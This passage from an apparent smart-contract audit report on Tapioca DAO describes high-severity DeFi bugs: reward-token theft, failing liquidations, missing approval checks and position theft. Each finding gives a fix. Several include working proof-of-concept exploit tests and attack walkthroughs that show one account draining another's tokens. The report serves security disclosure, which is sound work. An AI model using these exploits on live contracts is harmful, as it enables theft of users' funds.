All these parameters passed here comes from the original lz payload sent by the user from chain A. Of note is the arrayrewardTokenswhich is a user inputted value.
This function then calls the twtap.sol contract as shown below.
trytwTap.claimAndSendRewards(tokenID,rewardTokens) {
In the twTAP contract, the functionclaimAndSendRewardseventually calls_claimRewardsOn, the functionality of which is shown below.
function_claimRewardsOn(uint256_tokenId,address_to,IERC20[]memory_rewardTokens)internal{uint256[]memoryamounts=claimable(_tokenId);unchecked{uint256len=_rewardTokens.length;for(uint256i=0;i<len; ) {uint256claimableIndex=rewardTokenIndex[_rewardTokens[i]];uint256amount=amounts[i];if(amount>0) {// Math is safe: `amount` calculated safely in `claimable()`claimed[_tokenId][claimableIndex] +=amount;rewardTokens[claimableIndex].safeTransfer(_to,amount);}++i;}}}
Here we want to investigate a case where a user sends some random address in the arrayrewardTokens. We already showed that this value is set by the user, and the above quoted snippet receives the same value in the_rewardTokensvariable.
In the for loop, the indexes are found. But ifrewardTokens[i]is a garbage address, the mappingrewardTokenIndexwill return the default value of 0 which will be stored inclaimableIndex. The arrayamountsstores the amounts of the different tokens that can be claimed by the user. But sinceclaimableIndexis now 0, thesafeTransferfunction in the end is always called on the tokenrewardTokens[0]. Thus a user can withdraw the rewardtoken in index 0 multiple times and in amounts based on the values stored in theamountsarray.
Thus we have shown that a user can steal an unfair amount of tokens stored in the 0 index of therewardTokensarray variable in the twTAP.sol contract. This will mess up the reward distribution for all users, and can lead to an insolvent contract. Thus this is deemed a high severity issue.
Proof of Concept
The attack can be done in the following steps:
Attacker callsclaimRewardson chain A. The attacker is assumed to have a valid position on chain B with pending rewards.The attacker passes an array of garbage addresses in therewardTokensparameter.The contract sends forth the message to the destination chain, where the twTAP contract is called to collect the rewards.As shown above, the reward token stored in index 0 is sent multiple times to the caller, which is theTapOFTcontract.In the TapOFT contract, the contract then sends all the collected rewards in the contract cross chain back to the attacker. Thus the tokens in index 0 were claimed and collected.
Thus the attacker can claim an unfair number of tokens present in the 0th index. If this token is more valuable than the other rewward tokens, the attacker can profit from this exploit.
Recommended Mitigation Steps
Mitigation can be done by not using the 0th index. The zero index of therewardTokensarray intwTAP.sol, if left empty, will point to the zero address, and if an unknown address is encountered, the contract will try to claim the tokens from the zero address which will revert.
This can be enforced by using the statementrewardTokens.push(address(0))in the constructor. However changes will need to be made on other operations in the contract which loops over this array to skip operations on this zero address now present in the array.
0xRektora (Tapioca) confirmed via duplicate issue 1093

[H-37] Liquidation transactions can potentially fail for all markets
Submitted byzzzitron, also found byGalloDaSballo
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L315-L316
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L340-L344
As an example, when callingBigBang.liquidate()the tx potentially fails, because the subsequent call toMarket.updateExchangeRate(BigBang.sol line 316) can face a revert condition on line 344 in Market.sol.
InMarket.updateExchangeRate()a revert is triggered ifrateis not bigger than 0 - see line 344 in Market.sol.
Liquidations should never fail and instead use the old exchange rate - see BigBang.sol line 315 comment:
// Oracle can fail but we still need to allow liquidations
But the liquidation transaction can potentially fail when trying to fetch the new exchange rate viaMarket.updateExchangeRate()as shown above.
This issue applies for all markets (Singularity, BigBang) since the revert during the liquidation happens in the Market.sol contract from which all markets inherit.
Because of this issue user’s collateral values may fall below their debt values, without being able to liquidate them, pushing the protocol into insolvency.
This is classified as high risk because liquidation is an essential functionality of the protocol.
Proof of Concept
Here is a POC that shows that a liquidation tx reverts according to the issue described above:
https://gist.github.com/zzzitron/90206267434a90990ff2ee12e7deebb0
Recommended Mitigation Steps
Instead of reverting on line 344 in Market.sol when fetching the exchange rate, consider to return the old rate instead, so that the liquidation can be executed successfully.
0xRektora (Tapioca) confirmed

[H-38] Magnetar contract has no approval checking
Submitted bycarrotsmuggler, also found by0xStalin
TheMagnetar.solcontract has a lot of useful helper function to carry out operations on user market positions. If a user wishes to use the helper functions, they have to first give approval to the Magnetar contract to manipulate their positions. As an example, for the big bang markets, this is done by calling theupdateOperatorfunction.
functionupdateOperator(addressoperator,boolstatus)external{operators[msg.sender][operator] =status;}
Since this is a helper function, we can expect users to give this approval in order to use these functions. However the issue is that any attacker can use these approvals to manipulate and drain positions of other users.
As an example, let us look at thewithdrawToChainfunction. Lets assume an attacker is calling this function, and the victim’s address is passed in thefromfield. Assume the victim has given all approvals to the Magnetar contracts. The function delegates this to thewithdrawToChainin the Market module.
InwithdrawToChainfunction, there are no checks on themsg.senderaddress. The function interacts with yieldbox and does a crosschain send to theerceiveraddress passed by the attacker.
if(dstChainId==0) {yieldBox.withdraw(assetId,from,LzLib.bytes32ToAddress(receiver),amount,share);return;}yieldBox.withdraw(assetId,from,address(this),amount,0);ISendFrom(address(asset)).sendFrom{value:gas}(address(this),dstChainId,receiver,amount,callParams);
This sends the tokens to thereceiveraddress either in the same chain or cross-chain. This lets any user steal tokens from any other user, exploiting the approval given to the magnetar address.
While this report only discusses the issue with this one function, the same issue is present for every function in the magnetar contract. This allows attackers to manipulate bigbang markets and singularity markets as well. Thus this is a high severity issue.
Proof of Concept
A POC is developed by editing the test present in magnetar.test.ts. Only a single change is made to the test. The lastwithdrawToChaincall is done from theeoa1address instead of the deployer address.
it.only("should test withdrawTo",async()=>{const{deployer,eoa1,yieldBox,createTokenEmptyStrategy,deployCurveStableToUsdoBidder,usd0,bar,__wethUsdcPrice,wethUsdcOracle,weth,wethAssetId,mediumRiskMC,usdc,magnetar,initContracts,timeTravel,} =awaitloadFixture(register)constusdoStratregy=awaitbar.emptyStrategies(usd0.address)constusdoAssetId=awaityieldBox.ids(1,usd0.address,usdoStratregy,0)//Deploy & set SingularityconstSGLLiquidation=newSGLLiquidation__factory(deployer)const_sglLiquidationModule=awaitSGLLiquidation.deploy()constSGLCollateral=newSGLCollateral__factory(deployer)const_sglCollateralModule=awaitSGLCollateral.deploy()constSGLBorrow=newSGLBorrow__factory(deployer)const_sglBorrowModule=awaitSGLBorrow.deploy()constSGLLeverage=newSGLLeverage__factory(deployer)const_sglLeverageModule=awaitSGLLeverage.deploy()constnewPrice=__wethUsdcPrice.div(1000000)awaitwethUsdcOracle.set(newPrice)constsglData=newethers.utils.AbiCoder().encode(["address","address","address","address","address","address","uint256","address","uint256","address","uint256",],[_sglLiquidationModule.address,_sglBorrowModule.address,_sglCollateralModule.address,_sglLeverageModule.address,bar.address,usd0.address,usdoAssetId,weth.address,wethAssetId,wethUsdcOracle.address,ethers.utils.parseEther("1"),])awaitbar.registerSingularity(mediumRiskMC.address,sglData,true)constwethUsdoSingularity=newethers.Contract(awaitbar.clonesOf(mediumRiskMC.address,(awaitbar.clonesOfCount(mediumRiskMC.address)).sub(1)),SingularityArtifact.abi,ethers.provider).connect(deployer)//Deploy & set LiquidationQueueawaitusd0.setMinterStatus(wethUsdoSingularity.address,true)awaitusd0.setBurnerStatus(wethUsdoSingularity.address,true)constLiquidationQueueFactory=awaitethers.getContractFactory("LiquidationQueue")constliquidationQueue=awaitLiquidationQueueFactory.deploy()constfeeCollector=newethers.Wallet(ethers.Wallet.createRandom().privateKey,ethers.provider)const{stableToUsdoBidder} =awaitdeployCurveStableToUsdoBidder(deployer,bar,usdc,usd0)constLQ_META= {activationTime:600,// 10minminBidAmount:ethers.BigNumber.from((1e18).toString()).mul(200),// 200 USDCcloseToMinBidAmount:ethers.BigNumber.from((1e18).toString()).mul(202),defaultBidAmount:ethers.BigNumber.from((1e18).toString()).mul(400),// 400 USDCfeeCollector:feeCollector.address,bidExecutionSwapper:ethers.constants.AddressZero,usdoSwapper:stableToUsdoBidder.address,}awaitliquidationQueue.init(LQ_META,wethUsdoSingularity.address)constpayload=wethUsdoSingularity.interface.encodeFunctionData("setLiquidationQueueConfig",[liquidationQueue.address,ethers.constants.AddressZero,ethers.constants.AddressZero,])await(awaitbar.executeMarketFn([wethUsdoSingularity.address],[payload],true)).wait()constusdoAmount=ethers.BigNumber.from((1e18).toString()).mul(10)constusdoShare=awaityieldBox.toShare(usdoAssetId,usdoAmount,false)awaitusd0.mint(deployer.address,usdoAmount)constdepositAssetEncoded=yieldBox.interface.encodeFunctionData("depositAsset",[usdoAssetId,deployer.address,deployer.address,0,usdoShare])constsglLendEncoded=wethUsdoSingularity.interface.encodeFunctionData("addAsset",[deployer.address,deployer.address,false,usdoShare])awaitusd0.approve(magnetar.address,ethers.constants.MaxUint256)awaitusd0.approve(yieldBox.address,ethers.constants.MaxUint256)awaitusd0.approve(wethUsdoSingularity.address,ethers.constants.MaxUint256)awaityieldBox.setApprovalForAll(deployer.address,true)awaityieldBox.setApprovalForAll(wethUsdoSingularity.address,true)awaityieldBox.setApprovalForAll(magnetar.address,true)awaitweth.approve(yieldBox.address,ethers.constants.MaxUint256)awaitweth.approve(magnetar.address,ethers.constants.MaxUint256)awaitwethUsdoSingularity.approve(magnetar.address,ethers.constants.MaxUint256)constcalls= [{id:100,target:yieldBox.address,value:0,allowFailure:false,call:depositAssetEncoded,},{id:203,target:wethUsdoSingularity.address,value:0,allowFailure:false,call:sglLendEncoded,},]awaitmagnetar.connect(deployer).burst(calls)constybBalance=awaityieldBox.balanceOf(deployer.address,usdoAssetId)expect(ybBalance.eq(0)).to.be.trueconstsglBalance=awaitwethUsdoSingularity.balanceOf(deployer.address)expect(sglBalance.gt(0)).to.be.trueconstborrowAmount=ethers.BigNumber.from((1e17).toString())awaittimeTravel(86401)constwethMintVal=ethers.BigNumber.from((1e18).toString()).mul(1)awaitweth.freeMint(wethMintVal)awaitwethUsdoSingularity.connect(deployer).approveBorrow(magnetar.address,ethers.constants.MaxUint256)constborrowFn=magnetar.interface.encodeFunctionData("depositAddCollateralAndBorrowFromMarket",[wethUsdoSingularity.address,deployer.address,wethMintVal,0,true,true,{withdraw:false,withdrawLzFeeAmount:0,withdrawOnOtherChain:false,withdrawLzChainId:0,withdrawAdapterParams:ethers.utils.toUtf8Bytes(""),},])letborrowPart=awaitwethUsdoSingularity.userBorrowPart(deployer.address)expect(borrowPart.eq(0)).to.be.trueawaitmagnetar.connect(deployer).burst([{id:206,target:magnetar.address,value:ethers.utils.parseEther("2"),allowFailure:false,call:borrowFn,},],{value:ethers.utils.parseEther("2"),})constcollateralBalance=awaitwethUsdoSingularity.userCollateralShare(deployer.address)constcollateralAmpunt=awaityieldBox.toAmount(wethAssetId,collateralBalance,false)expect(collateralAmpunt.eq(wethMintVal)).to.be.trueconsttotalAsset=awaitwethUsdoSingularity.totalSupply()awaitwethUsdoSingularity.connect(deployer).borrow(deployer.address,deployer.address,borrowAmount)borrowPart=awaitwethUsdoSingularity.userBorrowPart(deployer.address)expect(borrowPart.gte(borrowAmount)).to.be.trueconstreceiverSplit=deployer.address.split("0x")awaitmagnetar.connect(eoa1).withdrawToChain(yieldBox.address,deployer.address,usdoAssetId,0,"0x".concat(receiverSplit[1].padStart(64,"0")),borrowAmount,0,"0x00",deployer.address,0)constusdoBalanceOfDeployer=awaitusd0.balanceOf(deployer.address)expect(usdoBalanceOfDeployer.eq(borrowAmount)).to.be.true})
This test passes, showing that theeoa1address is able to withdraw tokens belonging to the deployer.
Tools Used
Hardhat
Recommended Mitigation Steps
Add approval checks to all functions in the Magnetar contract.
0xRektora (Tapioca) confirmed

[H-39]AaveStrategy.sol: Changing swapper breaks the contract
Submitted bycarrotsmuggler, also found by0xfuje,Vagner,kaden,rvierdiiev, andladboy233
The contractAaveStrategy.solmanages wETH tokens and deposits them to the aave lending pool, and collects rewards. These rewards are then swapped into WETH again to compound on the WETH being managed by the contract. this is done in thecompoundfunction.
uint256calcAmount=swapper.getOutputAmount(swapData,"");uint256minAmount=calcAmount- (calcAmount*50) /10_000;//0.5%swapper.swap(swapData,minAmount,address(this),"");
To carry out these operations, the swapper contract needs to be given approval to use the tokens being stored in the strategy contract. This is required since the swapper contract calls transferFrom on the tokens to pull it out of the strategy contract. This allowance is set in the constructor.
rewardToken.approve(_multiSwapper,type(uint256).max);
The issue arises when the swapper contract is changed. The change is done via thesetMultiSwapperfunction. This function however does not give approval to the new swapper contract. Thus if the swapper is upgraded/changed, the approval is not transferred to the new swapper contract, which makes the swappers dysfunctional.
Since the swapper is critical to the system, andcompoundis called before withdrawals, a broken swapper will break the withdraw functionality of the contract. Thus this is classified as a high severity issue.
Proof of Concept
The bug is due to the absence ofapprovecalls in thesetMultiSwapperfunction. This can be seen from the implementation of the function.
functionsetMultiSwapper(address_swapper)externalonlyOwner{emitMultiSwapper(address(swapper),_swapper);swapper=ISwapper(_swapper);}
Recommended Mitigation Steps
In thesetMultiSwapperfunction, remove approval from the old swapper and add approval to the new swapper. The same function has the proper implementation in theConvexTricryptoStrategy.solcontract which can be used here as well.
functionsetMultiSwapper(address_swapper)externalonlyOwner{emitMultiSwapper(address(swapper),_swapper);rewardToken.approve(address(swapper),0);swapper=ISwapper(_swapper);rewardToken.approve(_swapper,type(uint256).max);}
0xRektora (Tapioca) confirmed via duplicate issue 222

[H-40]BalancerStrategy.sol:_withdrawwithdraws insufficient tokens
Submitted bycarrotsmuggler, also found bykaden,n1punp, andchaduke
The funciton_withdrawin the balancer strategy contract is called during withdraw operations to withdraw WETH from the balancer pool. The function calculats the amount to withdraw, and then calls_vaultWithdrawfunction.
if(amount>queued) {uint256pricePerShare=pool.getRate();uint256decimals=IStrictERC20(address(pool)).decimals();uint256toWithdraw= (((amount-queued) * (10**decimals)) /pricePerShare);_vaultWithdraw(toWithdraw);}
The function_vaultWithdrawsubmits an exit request with the following userData.
exitRequest.userData=abi.encode(2,exitRequest.minAmountsOut,pool.balanceOf(address(this)));
A value of 2 here corresponds to specifying the exact number of tokens coming out of the contract. Thus the function_vaultWithdrawwill withdraw the exact number of tokens passed to it in its parameter.
The issue however is that the function_vaultWithdrawis not called with the amount of tokens needed to be withdrawn, it is called by the amount scaled down bypricePerShare. Thus if the actual withdrawn amount is less the amounts the user actually wanted. This causes a revert in the next step.
require(amount<=wrappedNative.balanceOf(address(this)),"BalancerStrategy: not enough");
Since an insuffucient amount of tokens are withdrawn, this step will revert if there arent enough spare tokens in the contract. Since the contract incorrectly scales doen the withdraw amount and causes a revert, this is classified as a high severity issue.
Proof of Concept
The following exercise shows that passing the sameexitRequestdata to the balancerPool actually extracts the exact number of tokens as specified inminamountsOut.
A position is created on optimism’s weth-reth pool. TheuserDatais generated using the following code.
```solidityfunction temp() external pure returns(bytes memory){uint256[] memory amts = new uint256[](2);amts[0] = 500;amts[1] = 0;uint256 max = 20170422329691;return(abi.encode(2,amts,max));}
Min amount out of WETH is set to 500 wei. TheexitRequestis then constructed as follows with the userData from above.
{"assets": ["0x4200000000000000000000000000000000000006","0x9bcef72be871e61ed4fbbc7630889bee758eb81d"],"minAmountsOut": ["500","0"],"toInternalBalance":false,"userData":"0x00000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000012584adba15b000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000001f40000000000000000000000000000000000000000000000000000000000000000"}
This is an exit request of type 2, which specifies the exact amount of tokens to be withdrawn. This transaction was then run on tenderly to check how many tokens are withdrawn. From the screenshotherefrom tenderly we can see only 500 wei of WETH is withdrawn.
This proves that the_vaultWithdrawfunction withdraws the exact amount of tokens passed to it as a parameter. Since the passed parameter is scaled down bypricePerShare, this leads to an insufficient amount withdrawn, and eventually a revert.
Tools Used
Tenderly
Recommended Mitigation Steps
Pass the amount to be withdrawn without scaling it down bypricePerShare.
0xRektora (Tapioca) confirmed via duplicate issue 51

[H-41] Rewards compounded in AaveStrategy are unredeemable
Submitted byAck, also found bykadenandrvierdiiev
The AaveStrategy contract is designed to:
Receive depositor’s ERC20 tokens from yieldBoxDeposit those tokens into an AAVE lending poolAllow anyone to callcompound(), which:
a. Claims AAVE rewards from theincentivesControllerb. Claims staking rewards from thestakingRewardToken(stkAAVE)
c. Redeeming staking rewards is only possible within a certain cooldown window that is set by AAVE governance. The function resets the cooldown if either 12 days have passed since the cooldown was last initiated, or if the strategy has a stakedRewardToken balance
d. Swaps any receivedrewardToken($AAVE) forwrappedNativee. Deposits thewrappedNativereceived in the swap into the lending pool
There are several issues with this flow, but this vulnerability report is specific to redeeming staked rewards. The incentives controller specified in themainnet.envfile is at address 0xd784927Ff2f95ba542BfC824c8a8a98F3495f6b5 (proxy). ItsclaimRewardsfunction stakes tokens directly:
function _claimRewards(...) internal returns (uint256) {...uint256 accruedRewards = _claimRewards(user, userState);...STAKE_TOKEN.stake(to, amountToClaim); //@audit claimed rewards are staked immediately...}
The only way to retrieve tokens once staked is via a call tostakingRewardToken#redeem(), which is not present in the AaveStrategy contract. As a result, any rewards accumulated via the incentiveController would not be claimable.
Impact
High - Loss of funds
Proof of concept
This is unfortunately difficult to PoC as the AAVE incentive/staking rewards do not accumulate properly in the fork tests, and the mocks do not exhibit the same behavior.
Recommended Mitigation Steps
Include a call to redeem incompound().
0xRektora (Tapioca) confirmed via duplicate issue 243

[H-42] Attacker can steal victim’s oTAP position contents viaMagnetarMarketModule#_exitPositionAndRemoveCollateral()
Submitted byAck, also found byzzebra83
NOTE: This vulnerability relies on the team implementing anonERC721Received()function in Magnetar. As is currently written, attempts to exit oTAP positions via Magnetar will always revert as Magnetar cannot receive ERC721s, despite this being the clear intention of the function. This code path was not covered in the tests. Once implemented, however, an attack vector to steal twAML-locked oTAP positions opens.
Also, this is a similar but distinct attack vector from #933.
MagnetarMarketModule#_exitPositionAndRemoveCollateral()is a complex function used to perform any combination of: exiting an oTAP position, unlocking a locked tOLP position, removing assets and collateral from Singularity/bigBang, and repaying loans. The function achieves this by employing separate “if” clauses for each task that the caller would like to perform. These clauses are entered based on flags the caller provides in the argument structremoveAndRepayData.
Along with the set of operations to perform, the caller also provides:
addressuserto operate onaddress externalData.bigBangaddress externalData.singularityaddress yieldbox (obtained by calling the user-providedISingularity(externalData.singularity).yieldBox())
As the caller has full control of all of these parameters, he can execute attacks to steal assets that have been approved to Magnetar.
Impact
High - Theft of funds
Proof of concept
Unfortunately the Magnetar tests do not cover the case where we wish to exit our oTAP position, and the periphery testing infrastructure does not include helper functions for the oTAP workflows (at least that I was able to find). This makes a coded PoC difficult and time consuming. Please consider the following walkthrough and reach out if a coded example is necessary.
In this case, we’re going to assume that a victim wants to use this function as-designed to exit his twAML-locked oTAP position. In order to do so he needs to grant approval in  for Magnetar to transfer his position.
Once approved, anyone can call_exitPositionAndRemoveCollateral()with his own set of target addresses (some valid Tapioca addresses, some attacker-owned contracts) and the approver asuser.
The attack is as follows:
Victim approves Magnetar to control his oTAP positionsAttacker first calls_exitPositionAndRemoveCollateral(), with:removeAndRepayData.exitData.exit = trueremoveAndRepayData.unlockData.unlock = trueTheuserto steal fromthetokenIdto exit + stealremoveAndRepayData.unlockData.target = an attacker-controlled contract that just passes when called with.unlock()Magnetar transfers the oTAP position to itself and exits the position. It retains the yieldbox shares at the end of the callAttacker calls_exitPositionAndRemoveCollateral(), with:removeAndRepayData.exitData.exit = falseremoveAndRepayData.unlockData.unlock = trueTheuseris the attacker’s address for receiving the unlocked sharesthe tokenId to exit + stealremoveAndRepayData.unlockData.target = the real tOLP contract
(The attacker could have alternately used a similar bigBang attacker contract approach for removing the yieldbox shares in step 4 as in #933 )
function_exitPositionAndRemoveCollateral(// @audit called via delegatecall from core MagnetarV2 w/o any agument validationaddressuser,ICommonData.ICommonExternalContractscalldataexternalData,IUSDOBase.IRemoveAndRepaycalldataremoveAndRepayData)private{IMarketbigBang=IMarket(externalData.bigBang);// @audit all 3 of these can be attacker controlledISingularitysingularity=ISingularity(externalData.singularity);IYieldBoxBaseyieldBox=IYieldBoxBase(singularity.yieldBox());uint256tOLPId=0;if(removeAndRepayData.exitData.exit) {// @audit true, enter this blockrequire(removeAndRepayData.exitData.oTAPTokenID>0,// @audit oTAP ID we want to unlock+steal"Magnetar: oTAPTokenID 0");addressoTapAddress=ITapiocaOptionsBroker(removeAndRepayData.exitData.target// @audit target here is attacker-controlled, but retrieve the real oTAP address).oTAP();(,ITapiocaOptions.TapOptionmemoryoTAPPosition) =ITapiocaOptions(// @audit get the oTAP postion we're exitingoTapAddress).attributes(removeAndRepayData.exitData.oTAPTokenID);tOLPId=oTAPPosition.tOLP;addressownerOfTapTokenId=IERC721(oTapAddress).ownerOf(removeAndRepayData.exitData.oTAPTokenID);require(ownerOfTapTokenId==user||ownerOfTapTokenId==address(this),// @audit owner is user, passes"Magnetar: oTAPTokenID owner mismatch");if(ownerOfTapTokenId==user) {// @audit trueIERC721(oTapAddress).safeTransferFrom(// @audit transfer the token hereuser,address(this),removeAndRepayData.exitData.oTAPTokenID,"0x");}ITapiocaOptionsBroker(removeAndRepayData.exitData.target)// @audit address is.exitPosition(removeAndRepayData.exitData.oTAPTokenID);if(!removeAndRepayData.unlockData.unlock) {// @audit unlock = true, skip thisIERC721(oTapAddress).safeTransferFrom(address(this),user,removeAndRepayData.exitData.oTAPTokenID,"0x");}}// performs a tOLP.unlock operationif(removeAndRepayData.unlockData.unlock) {if(removeAndRepayData.unlockData.tokenId!=0) {if(tOLPId!=0) {require(tOLPId==removeAndRepayData.unlockData.tokenId,"Magnetar: tOLPId mismatch");}tOLPId=removeAndRepayData.unlockData.tokenId;}// @audit .target here is attacker controlled  - just pass first time!//        Second time, the attacker specifies the real tOLP contract and themselves as "user" to have the tokens unlocked to their addressITapiocaOptionLiquidityProvision(removeAndRepayData.unlockData.target).unlock(tOLPId,externalData.singularity,user);}
Recommended Mitigation Steps
Do not allow arbitrary address input in these complex, multi-use functions.Consider breaking this into multiple standalone functionsRequire user == msg.sender
> 0xRektora (Tapioca) confirmed

[H-43] Accounted balance of GlpStrategy does not match withdrawable balance, allowing for attackers to steal unclaimed rewards
Submitted bykaden, also found by kaden (1,2) andcergyk
Attackers can steal unclaimed rewards due to insufficient accounting.
Proof of Concept
Pricing of shares for Yieldbox strategies is dependent upon the total underlying balance of the strategy. We can see below how we mint an amount of shares according to this underlying amount.
// depositAsset()uint256totalAmount=_tokenBalanceOf(asset);if(share==0) {// value of the share may be lower than the amount due to rounding, that's okshare=amount._toShares(totalSupply[assetId],totalAmount,false);}else{// amount may be lower than the value of share due to rounding, in that case, add 1 to amount (Always round up)amount=share._toAmount(totalSupply[assetId],totalAmount,true);}_mint(to,assetId,share);
The total underlying balance of the strategy is obtained viaasset.strategy.currentBalance.
function_tokenBalanceOf(Assetstorageasset)internalviewreturns(uint256amount) {returnasset.strategy.currentBalance();}
GlpStrategy._currentBalancedoes not properly track all unclaimed rewards.
function_currentBalance()internalviewoverridereturns(uint256amount) {// This _should_ included both free and "reserved" GLP:amount=IERC20(contractAddress).balanceOf(address(this));}
As a result, attackers can:
Deposit a high amount when there are unclaimed rewardsReceiving a higher amount of shares than they would if accounting included unclaimed rewardsHarvests unclaimed rewards, increasing_currentBalance, only after they received sharesWithdraw all sharesNow that the balance is updated to include previously unclaimed rewards, the attacker profits their relative share of the unclaimed rewardsThe more the attacker deposits relative to the strategy balance, the greater proportion of interest they receive
Recommended Mitigation Steps
It’s recommended that_currentBalanceinclude some logic to retrieve the amount and value of unclaimed rewards to be included in it’s return value.
cryptolyndon (Tapioca confirmed)

[H-44]BigBang::repayandSingularity::repayspend more than allowed amount
Submitted byzzzitron
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L263-L268
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L721-L732
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/a4793e75a79060f8332927f97c6451362ae30201/contracts/markets/singularity/SGLLendingCommon.sol#L83-L95
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/a4793e75a79060f8332927f97c6451362ae30201/contracts/markets/singularity/SGLBorrow.sol#L45-L52
When an user allows certain amount to a spender, the spender can spend more than the allowance.
Note that this is a different issue from the misuse ofallowedBorrowfor the share amount
(i.e. issue ”BigBang::repayusesallowedBorrowwith the asset amount, whereas other functions use it with share of collateral”), as the fix in the other issue will not mitigate this issue.
This issue is the misuse ofpartandelastic, whereas the other issue is the misuse of theshareandasset.
Proof of Concept
The spec in theMarketERC20::approvefunction specifies that the approved amount is the maximum amount that the spender can draw.
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/364dead3a42b06a34c802eee951cea1a654d438e/contracts/markets/MarketERC20.sol#L189-L200
/// @notice Approves `amount` from sender to be spend by `spender`./// @param spender Address of the party that can draw from msg.sender's account./// @param amount The maximum collective amount that `spender` can draw./// @return (bool) Returns True if approved.function approve(address spender,uint256 amount) public override returns (bool) {
However, the spender can draw more than the allowance if thetotalBorrow.baseis more thanttotalBorrow.elastic, which is likely condition.
The proof of concept below demonstrates that more asset was pulled than allowed.
It is only a part of proof of concept; to see the full proof of concept seehttps://gist.github.com/zzzitron/8dd809c0ea39dc0ea727534c3ba804f9To use it, put it in thetest/bigBang.test.tsin the tapiocabar-audit repo
The eoa1 allows deployer 1e18. After thetimeTravel, the elastic oftotalBorrowis more than thebase. Under the condition, the deployer uses the allowance with theBigBang::repayfunction. As the result, more asset than allowance was pulled from eoa1.
it('should not allow repay more PoCRepayMoreThanAllowed',async()=>{////////// setup steps are omitted// the full proof of concept is// https://gist.github.com/zzzitron/8dd809c0ea39dc0ea727534c3ba804f9////////// eoa1 allows deployer (it should be `approve`, if the modifier in the repay is `allowedLend`)constallowedPart=ethers.BigNumber.from((1e18).toString());awaitwethBigBangMarket.connect(eoa1).approveBorrow(deployer.address,allowedPart);//repay from eoa1// check more than the allowed amount is pulled from yieldBoxtimeTravel(10*86400);// repay from eoa1 the allowed amount// balance before repay of eoa in the yieldBox for the assetconstusdoAssetId=awaitwethBigBangMarket.assetId();consteoa1ShareBalanceBefore=awaityieldBox.balanceOf(eoa1.address,usdoAssetId);consteoa1AmountBefore=awaityieldBox.toAmount(usdoAssetId,eoa1ShareBalanceBefore,false);awaitwethBigBangMarket.repay(eoa1.address,deployer.address,false,allowedPart,);consteoa1ShareBalanceAfter=awaityieldBox.balanceOf(eoa1.address,usdoAssetId);consteoa1AmountAfter=awaityieldBox.toAmount(usdoAssetId,eoa1ShareBalanceAfter,false);console.log(eoa1AmountBefore.sub(eoa1AmountAfter).toString());expect(eoa1AmountBefore.sub(eoa1AmountAfter).gt(allowedPart)).to.be.true;});
The result of the poc is below, which shows that1000136987569097987is pulled from the eoa1, which is more than the allowance (i.e. 1e18).
BigBang testpoc1000136987569097987✔ should not allow repay more PoCRepayMoreThanAllowed (11934ms)
The same issue is also in theSingularity. In the same manner shown above, the spender will pull more than allowed when thetotalBorrow.elasticis bigger than thetotalBorrow.base.
Details of the bug
The functionBigBang::repayusespartto check for the allowance.
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L263-L268
However, theBigBang::_repaydraws actually the correspondingelasticof thepartfrom thefromaddress.
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L721-L732
function_repay(addressfrom,addressto,uint256part)internalreturns(uint256amount) {(totalBorrow,amount) =totalBorrow.sub(part,true);userBorrowPart[to] -=part;uint256toWithdraw= (amount-part);//acrrueduint256toBurn=amount-toWithdraw;yieldBox.withdraw(assetId,from,address(this),amount,0);
The similar lines of code is also in theSingularity. TheSingularity::repaywill delegate call on theSGLBorrow::repay, which has the modifier ofallowedBorrow(from, part):
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/a4793e75a79060f8332927f97c6451362ae30201/contracts/markets/singularity/SGLBorrow.sol#L45-L51
// SGLBorrowfunctionrepay(addressfrom,addressto,boolskim,uint256part)publicnotPausedallowedBorrow(from,part)returns(uint256amount) {updateExchangeRate();
Then,amountis calculated from thepart, and theamountis pulled from thefromaddress in the below code snippet.
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/a4793e75a79060f8332927f97c6451362ae30201/contracts/markets/singularity/SGLLendingCommon.sol#L83-L95
function_repay(addressfrom,addressto,boolskim,uint256part)internalreturns(uint256amount) {(totalBorrow,amount) =totalBorrow.sub(part,true);userBorrowPart[to] -=part;uint256share=yieldBox.toShare(assetId,amount,true);uint128totalShare=totalAsset.elastic;_addTokens(from,to,assetId,share,uint256(totalShare),skim);totalAsset.elastic=totalShare+uint128(share);emitLogRepay(skim?address(yieldBox) :from,to,amount,part);}
Theamountis likely to be bigger than thepart, since the calculation is based on thetotalBorrow’s ratio betweenelasticandbase.
Then theamountis used to withdraw fromfromaddress, meaning that more than the allowance is withdrawn.
The discrepancy between the allowance and actually spendable amount is going to grow in time, as thetotalBorrow’s elastic will outgrow the base in time.
Tools Used
Hardhat
Recommended Mitigation Steps
Instead of using thepartto check the allowance, calculate the actual amount to be pulled and use the amount to check the allowance.
0xRektora (Tapioca) confirmed

[H-45]SGLLiquidation::_computeAssetAmountToSolvency,Market::_isSolventandMarket::_computeMaxBorrowableAmountmay overestimate the collateral, resulting in false solvency
Submitted byzzzitron
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L415-L421
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L385-L399
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L781-L785
